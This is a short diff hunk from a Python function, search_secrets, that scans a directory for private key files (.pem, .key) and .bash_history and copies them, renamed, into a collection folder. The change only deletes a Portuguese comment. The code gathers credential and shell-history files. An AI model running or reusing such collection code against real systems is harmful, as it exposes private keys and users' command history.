@@ -12,7 +12,6 @@ def search_secrets(scan_path):
             
             if file in targets or file.endswith(('.pem', '.key')):
                 try:
-                    # Se for o histórico, renomeia para ficar claro na pasta
                     new_name = "bash_history.txt" if file == ".bash_history" else f"key_{file}"
                     dest = os.path.join(scan_path, new_name)
                     
